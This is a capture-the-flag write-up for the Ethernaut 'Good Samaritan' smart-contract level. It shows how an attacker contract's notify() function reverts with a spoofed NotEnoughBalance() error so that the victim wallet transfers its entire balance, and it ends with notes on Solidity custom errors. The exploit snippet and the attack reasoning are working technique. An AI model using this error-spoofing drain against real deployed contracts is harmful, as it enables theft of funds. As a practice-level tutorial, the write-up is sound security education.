# 27) Good Samaritan

Success condition:
> This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it.
Would you be able to drain all the balance from his Wallet?
Things that might help:
Solidity Custom Errors 

We need to drain the contract, we can call `requestDonation()` which will drain 10 coin at the time, and while this function has a reentrancy vulnerability (it calls our attack contract's notify() function), the gas cost would be way too high.

If we take a look at  `requestDonation()`:
```solidity
function requestDonation() external returns (bool enoughBalance) {
    // donate 10 coins to requester
    try wallet.donate10(msg.sender) { //regular logic of the function, simply transfer 10 coin
        return true;
    } catch (bytes memory err) { //but if an error occur and this error is "NotEnoughBalance()", the wallet will transfer all remaining coins
        if (
            keccak256(abi.encodeWithSignature("NotEnoughBalance()")) ==
            keccak256(err)
        ) {
            // send the coins left
            wallet.transferRemainder(msg.sender);
            return false;
        }
    }
}
```
We can that it check for error during `donate10()`.
If we can manage to throw a "NotEnoughBalance()" error during the regular execution of the function (while there is still a lot of coins) we can get all of them transfer to us. Since `transfer()` call a function on our attack contract (if we call `requestDonation()` from a contract):
```solidity
if (dest_.isContract()) {
    // notify contract
    INotifyable(dest_).notify(amount_);
}
```
We can send that error in this function.

Our attack contract need a function that will call `donate10()` to start the attack, and then implement a `notify()` function that will throw the error:
```solidity
function notify(uint256 amount) external pure {
    //we dont want an error when the contract send us all of the money
    if (amount == 10) {
        revert NotEnoughBalance();
    }
}
```
When the victim contract call our `notify()`, an error will be thrown, which will call `wallet.transferRemainder(msg.sender)` which sends us the funds (and call `notify()` again but this time no error will be thrown.)
We can check that we have received the funds with:
```python
coin_address = good_samaritan.coin()
coin = Contract.from_abi(Coin._name, coin_address, Coin.abi)
print(f" Balance: {coin.balances(attack_contract)}")
```

### Note
Since rinkeby is gone, I now deployed the solution to [goerli](https://goerli.etherscan.io/address/0x9f02f295c3ceb8bdaa87b1d2441687f7301dc4c9).

---
### Custom Errors

Solidity 0.8.4 add a new way to throw errors that is more gas efficient (no need to save the string on the contract during deployment) than what we previously had to use eg.:
```solidity
(require(amount>0, "Contract: amount needs to be positive"))
```
We can now create a custom error:
```
error NegativeAmount(uint256 amount);
```
And use it like this:
```solidity
if (amount < 0)
    revert NegativeAmount({amount: amount});
```
The great thing with this new error statement is that you can return parameters.  
[Solidity blog](https://blog.soliditylang.org/2021/04/21/custom-errors/)  
[Solidity-by-example](https://solidity-by-example.org/error/)


---
## Level completed!

Congratulations! You have completed the level. Have a look at the Solidity code for the contract you just interacted with below.

Godspeed!!